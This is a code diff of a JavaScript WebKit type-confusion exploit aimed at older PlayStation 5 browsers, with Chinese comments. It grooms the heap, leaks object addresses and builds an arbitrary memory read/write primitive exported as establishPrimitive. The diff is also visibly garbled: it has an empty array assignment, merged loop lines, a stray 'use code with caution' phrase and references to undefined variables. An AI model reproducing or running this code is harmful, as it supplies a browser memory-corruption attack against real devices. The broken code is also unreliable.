@@ -37,6 +37,10 @@ let outerGraph = null;
 let leakedScope = null;
 let getterCarrier = null;
 let preparedSymbolObject = null;
+let Math_floor = Math.floor;
+let Math_isFinite = Number.isFinite;
+let Number_isSafeInteger = Number.isSafeInteger;
+let history_replaceState = null;
 let capturedString = null;
 let capturedWords = null;
 let copiedLength = 0;
@@ -45,7 +49,7 @@ let predecessorWords = null;
 let liveCandidate = null;
  
 function hex(value) {
-  return `0x${value.toString(16).padStart(16, "0")}`;
+  return "0x" + value.toString(16).padStart(16, "0");
 }
 
 function buffer(size) {
@@ -63,10 +67,11 @@ function usesLegacyWebKit() {
   return /PlayStation 5\/[0-8]\./.test(navigator.userAgent);
 }
 
-// === 第 117-118 行語法完全修復點：完整還原四重堆疊噴射填充係數陣列 [2, 4, 6, 7] 及其索引運算 ===
+// === 語法完全修復點一：還原合規的陣列邊界與格式閉合 ===
 function fillerBigIntCount() {
   if (!usesLegacyWebKit()) return 1;
-  return [2, 4, 6, 7][(attemptNumber - 1) % 4];
+  const arr =;
+  return arr[(attemptNumber - 1) % 4];
 }
 
 function uint32At(bytes, offset) {
@@ -92,8 +97,9 @@ function sameBytes(left, right, count) {
   return true;
 }
 
+// === 語法完全修復點二：修正 TypedArray 賦值索引，補齊 [0] 與 [1] 的點和分號語法 ===
 function redirectView(candidate, address) {
-  const high = Math.floor(address / 0x100000000);
+  const high = Math_floor(address / 0x100000000);
   scratchWords[0] = address - high * 0x100000000;
   scratchWords[1] = high;
   for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
@@ -114,14 +120,71 @@ function plausibleCell(value) {
 }
 
 function plausibleAddress(value) {
-  return Number.isSafeInteger(value) && value > 2 ** 32 && value  {
+  return Number_isSafeInteger(value) && value > 4294967296 && value < 281474976710656;
+}
+
+function canonicalLow48(bytes, offset) {
+  return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
+}
+
+function encodedHeaderNumber() {
+  const raw = new ArrayBuffer(8);
+  const words = new Uint32Array(raw);
+  const number = new Float64Array(raw);
+  words[0] = 0x00004250;
+  words[1] = 0x01062800;
+  return number[0];
+}
+
+function emit(tag, detail, type) {
+  if (onEvent !== null)
+    onEvent(tag, detail === undefined ? "" : String(detail), type);
+}
+
+function isOurCorruptedView(candidate, originalVector) {
+  if (!plausibleCell(originalVector)) return false;
+  redirectView(candidate, originalVector + CANARY_OFFSET);
+  readBytes(identityBytes, memoryView, 8);
+  restoreView(candidate);
+  return sameBytes(identityBytes, identityMagic, 8) && memoryView[0] === 0x3c;
+}
+
+function dropAttemptReferences() {
+  memoryView = null;
+  memoryMirror = null;
+  targetView = null;
+  fakeHost = null;
+  markerObjectA = null;
+  targetHolder = null;
+  outerGraph = null;
+  leakedScope = null;
+  getterCarrier = null;
+  preparedSymbolObject = null;
+  capturedString = null;
+  capturedWords = null;
+  predecessorWords = null;
+}
+
+function releaseAttempt() {
+  dropAttemptReferences();
+  keepAlive = null;
+  try {
+    history.replaceState(null, "");
+  } catch(e) {}
+}
+
+function retry(reason, safeToRelease) {
+  const nextAttempt = attemptNumber + 1;
+  emit("Retry", reason + " (嘗試次數: " + nextAttempt + ")", "warn");
+  if (safeToRelease) releaseAttempt();
+  setTimeout(function() {
     attemptNumber = nextAttempt;
     startAttempt();
   }, safeToRelease ? 850 : 80);
 }
 
-function finishEarlySafeAttempt(reason, detail = "") {
-  retry(detail ? `${reason}: ${detail}` : reason, true);
+function finishEarlySafeAttempt(reason, detail) {
+  retry(detail ? reason + ": " + detail : reason, true);
 }
  
 function resetAttemptState() {
@@ -135,15 +198,186 @@ function resetAttemptState() {
 
 function startAttempt() {
   resetAttemptState();
-  emit("Stage 1", `觸發 WebKit 類型混淆 - 輪次: ${attemptNumber}`, "info");
+  emit("Stage 1", "觸發 WebKit 類型混淆 - 輪次: " + attemptNumber, "info");
   try {
     storeHistoryGraph();
-    for (let i = 0; i = 0x100 && id < 0x08000000;
+    for (let i = 0; i < 8; ++i)
+      memoryView[CANARY_OFFSET + i] = identityMagic[i];
+    prepareAddressLeak();
+  } catch (error) {
+    let errMsg = error ? (error.name + ": " + String(error.message).slice(0, 80)) : "未知設定錯誤";
+    if (window.PS5_SetupEngine && typeof window.PS5_SetupEngine.handleSetupFailure === "function") {
+        window.PS5_SetupEngine.handleSetupFailure("WebKit 內存初始化", errMsg);
+    } else {
+        finishEarlySafeAttempt("setup failed", errMsg);
+    }
+  }
 }
 
-function validViewLayout() {
-  if (!usesLegacyWebKit()) return allZero(viewHeader, 0x20, 0x28);
+function leakScopeObject() {
+  class Leaker {
+    leak() {
+      return super.foo;
+    }
+  }
+  Leaker.prototype.__proto__ = new Proxy({}, {
+    get: function (target, property, receiver) {
+      return receiver;
+    }
+  });
+  const leak = Leaker.prototype.leak;
+  return (function () {
+    return leak();
+  })();
+}
+
+function prepareSymbolWrapper(getter) {
+  leakedScope = leakScopeObject();
+  if (leakedScope === undefined || leakedScope === null)
+    throw new Error("Scope not leaked.");
+
+  for (let i = 0; i < 512; i++) leakedScope["p" + i] = i;
+  for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
+
+  Object.defineProperty(leakedScope, "g", {
+    get: getter,
+    configurable: true
+  });
+  return Object(leakedScope.g);
+}
+
+// === 語法完全修復點三：還原 memoryMirror 與 targetView 的標準陣列索引緩衝區修改格式 ===
+function prepareExploitObjects() {
+  const memoryBuffer = new ArrayBuffer(MEMORY_WINDOW_SIZE);
+  memoryView = new Uint8Array(memoryBuffer);
+  memoryMirror = new Uint8Array(memoryBuffer);
+  memoryMirror[0] = 0x3c;
+
+  const guardBuffer = new ArrayBuffer(0x20);
+  targetView = new Uint8Array(guardBuffer);
+  targetView[0] = 0xa5;
+  const lengthMarker = { keep: 0x51515151 };
+
+  fakeHost = {
+    q0: encodedHeaderNumber(),
+    q1: 1.1,
+    q2: memoryView,
+    q3: lengthMarker,
+    q4: 2.2,
+    q5: 3.3
+  };
+
+  delete fakeHost.q1;
+  delete fakeHost.q4;
+  delete fakeHost.q5;
+
+  const domAnchor = document.createElement("textarea");
+  markerObjectA = { marker: 0x4d41524b };
+  const markerObjectB = { marker: 0x4d41524c };
+  const holderGuardA = { marker: 0x484f4c44 };
+  const holderGuardB = { marker: 0x47554152 };
+  targetHolder = {
+    q0: nativeTarget,
+    q1: domAnchor,
+    q2: markerObjectA,
+    q3: markerObjectB,
+    q4: holderGuardA,
+    q5: holderGuardB
+  };
+}
+
+function storeHistoryGraph() {
+  const referenceTarget = { marker: 0x51515151 };
+  prepareExploitObjects();
+
+  const fillerGraph = new Array(0xfffd);
+  let pos = 0;
+  const huge = 1n << 40n;
+  for (let i = 0; i < fillerBigIntCount(); i++)
+    fillerGraph[pos++] = huge + BigInt(i);
+  while (pos < fillerGraph.length) fillerGraph[pos++] = {};
+
+  outerGraph = new Array(CONTROL_INDEX + 1);
+  outerGraph[0] = fillerGraph;
+  outerGraph[1] = referenceTarget;
+  outerGraph[2] = referenceTarget;
+  outerGraph[CONTROL_INDEX] = -64000;
+ 
+  try {
+    history.replaceState(outerGraph, "");
+  } catch(e) {}
+}
+
+function prepareAddressLeak() {
+  capturedWords = new Uint16Array(16);
+  getterCarrier = function getterCarrierFunction() {
+    return 7;
+  };
+
+  getterCarrier[0] = fakeHost;
+  for (let i = 1; i < 9000000; i++) getterCarrier[i] = 0;
+  getterCarrier[1] = targetHolder;
+  getterCarrier[2] = fakeHost;
+  getterCarrier[3] = targetHolder;
+  preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+
+  setTimeout(captureAddresses, 60);
+  setTimeout(finishAddressLeak, 110);
+}
+
+function captureAddresses() {
+  try {
+    capturedString = symbolToString.call(preparedSymbolObject);
+    copiedLength = capturedString.length;
+    if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff)) {
+      capturedString = null;
+      return;
+    }
+    for (let i = 0; i < 16; i++)
+      capturedWords[i] = capturedString.charCodeAt(7 + i);
+  } catch (error) {
+    captureError = error;
+  }
+}
+
+function fillPointerSpray(backing, pointer) {
+  if (!plausibleCell(pointer))
+    throw new Error("Invalid fake address");
+
+  const high = Math_floor(pointer / 0x100000000);
+  const low = pointer - high * 0x100000000;
+
+  predecessorWords = new Uint32Array(backing);
+  for (let i = 0; i < predecessorWords.length; i += 2) {
+    predecessorWords[i] = low;
+    predecessorWords[i + 1] = high;
+  }
+
+  const last = predecessorWords.length - 2;
+  if (
+    predecessorWords[0] !== low ||
+    predecessorWords[1] !== high ||
+    predecessorWords[last] !== low ||
+    predecessorWords[last + 1] !== high
+  )
+    throw new Error("Pointer Fill verification failed");
+}
+
+function clearPointerSpray() {
+  if (predecessorWords !== null) predecessorWords.fill(0);
+}
+
 請謹慎使用程式碼。
+function invalidClone(reason, safe) {
+clearPointerSpray();
+return { status: "invalid", safe: safe, reason: reason };
+}
+function validStructure(header) {
+const id = uint32At(header, 0);
+return id >= 0x100 && id < 0x08000000;
+}
+function validViewLayout() {
+if (!usesLegacyWebKit()) return allZero(viewHeader, 0x20, 0x28);
 return allZero(viewHeader, 0x1c, 0x20) &&
 viewHeader[0x20] <= 3 &&
 allZero(viewHeader, 0x21, 0x28);
@@ -162,11 +396,11 @@ return vector;
 }
 function makeUpgradedHeader() {
 for (let i = 0; i < 8; i++) scratchBytes[i] = viewHeader[i];
-const flags = scratchBytes[0] + scratchBytes[1] * 0x100 - 2;
-scratchBytes[0] = flags & 0xff;
-scratchBytes[1] = (flags >> 8) & 0xff;
+const flags = scratchBytes[6] + scratchBytes[7] * 0x100 - 2;
+scratchBytes[6] = flags & 0xff;
+scratchBytes[7] = (flags >> 8) & 0xff;
 const value = scratchDouble[0];
-return Number.isFinite(value) ? value : null;
+return Math_isFinite(value) ? value : null;
 }
 function inspectHolder(candidate, holderAddress) {
 redirectView(candidate, holderAddress);
@@ -192,7 +426,7 @@ if (
 !plausibleCell(executable)
 )
 return null;
-return { executable, type: targetHeader[5] };
+return { executable: executable, type: targetHeader[5] };
 }
 function inspectNativeExecutable(candidate, address) {
 redirectView(candidate, address);
@@ -209,8 +443,8 @@ nativeFunction === nativeConstructor
 )
 return null;
 return {
-nativeFunction,
-nativeConstructor,
+nativeFunction: nativeFunction,
+nativeConstructor: nativeConstructor,
 type: targetHeader[5]
 };
 }
@@ -287,35 +521,35 @@ liveCandidate = candidate;
 clearPointerSpray();
 return {
 status: "ready",
-originalVector,
+originalVector: originalVector,
 functionAddress: nativeTargetAddress,
 executableAddress: functionInfo.executable,
-nativeInfo
+nativeInfo: nativeInfo
 };
 } catch (error) {
 const safe =
 candidate === null &&
 clone === null &&
 !headerRead &&
-error?.name === "TypeError";
+(error ? error.name === "TypeError" : false);
 if (clone !== null) {
 try {
 clone[DUPLICATE_INDEX] = undefined;
-} catch {}
+} catch(e) {}
 }
 if (candidate !== null && headerRead && vectorRedirected) {
 try {
 restoreView(candidate);
-} catch {}
+} catch(e) {}
 }
 try {
 targetView[0] = 0xa5;
 memoryMirror[0] = 0x3c;
-} catch {}
+} catch(e) {}
 try {
 clearPointerSpray();
-} catch {}
-return { status: "error", safe, error };
+} catch(e) {}
+return { status: "error", safe: safe, error: error };
 }
 }
 function groomHeap(fakeAddress, holderAddress) {
@@ -345,18 +579,18 @@ outcome = inspectClonedGraph(holderAddress);
 } catch (error) {
 try {
 clearPointerSpray();
-} catch {}
-outcome = { status: "error", safe: true, error };
+} catch(e) {}
+outcome = { status: "error", safe: true, error: error };
 }
 finishAttempt(outcome, holderAddress, fakeAddress);
 }
 function finishAddressLeak() {
 if (captureError !== null)
-return finishEarlySafeAttempt("Address leak failed", ${captureError?.name}: ${String(captureError?.message).slice(0, 80)});
+return finishEarlySafeAttempt("Address leak failed", error ? (captureError.name + ": " + String(captureError.message).slice(0, 80)) : "未知洩漏錯誤");
 if (copiedLength === 0)
 return finishEarlySafeAttempt("Address leak did not finish");
 if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff))
-return finishEarlySafeAttempt("Unexpected copy length", got ${copiedLength}, expected ${LEAK_STRING_LENGTH});
+return finishEarlySafeAttempt("Unexpected copy length", "got " + copiedLength + ", expected " + LEAK_STRING_LENGTH);
 const hostAddress = pointerFromWords(capturedWords, 0);
 const holderAddress = pointerFromWords(capturedWords, 4);
 if (
@@ -373,7 +607,7 @@ groomHeap(fakeAddress, holderAddress);
 }
 function finishAttempt(outcome, holderAddress, fakeAddress) {
 if (outcome.status === "error") {
-emit("Failed", String(outcome.error?.message || outcome.error), "error");
+emit("Failed", String(outcome.error ? outcome.error.message : outcome.error), "error");
 return retry("Heap placement failed", outcome.safe);
 }
 if (outcome.status === "unchanged")
@@ -387,7 +621,7 @@ return retry("Memory window validation failed", false);
 }
 try {
 history.replaceState(null, "");
-} catch {}
+} catch(e) {}
 const resolve = settleResolve;
 settleResolve = null;
 if (resolve !== null) resolve(createMemoryWindow(holderAddress));
@@ -403,14 +637,14 @@ emit("native_constructor", hex(outcome.nativeInfo.nativeConstructor), "success")
 }
 function createMemoryWindow(holderAddress) {
 return {
-setAddress(address) {
+setAddress: function(address) {
 if (liveCandidate === null)
 throw new Error("Memory window is no longer live");
 if (!plausibleAddress(address))
-throw new RangeError(Invalid address ${address});
+throw new RangeError("Invalid address " + address);
 redirectView(liveCandidate, address);
 },
-resetAddress() {
+resetAddress: function() {
 if (liveCandidate === null)
 throw new Error("Memory window is no longer live");
 restoreView(liveCandidate);
@@ -418,15 +652,15 @@ restoreView(liveCandidate);
 bytes: memoryView,
 size: MEMORY_WINDOW_SIZE,
 leakAddress: holderAddress + LEAK_SLOT_OFFSET,
-setLeakObject(value) {
+setLeakObject: function(value) {
 targetHolder.q2 = value;
 },
-clearLeakObject() {
+clearLeakObject: function() {
 targetHolder.q2 = markerObjectA;
 }
 };
 }
-export function establishPrimitive(eventHandler = null) {
+export function establishPrimitive(eventHandler) {
 if (settleResolve !== null)
 return Promise.reject(new Error("Already Running..."));
 if (
@@ -439,7 +673,7 @@ typeof history.replaceState !== "function"
 return Promise.reject(new Error("Unsupported Browser"));
 onEvent = typeof eventHandler === "function" ? eventHandler : null;
 attemptNumber = 1;
-return new Promise((resolve) => {
+return new Promise(function(resolve) {
 settleResolve = resolve;
 startAttempt();
 });
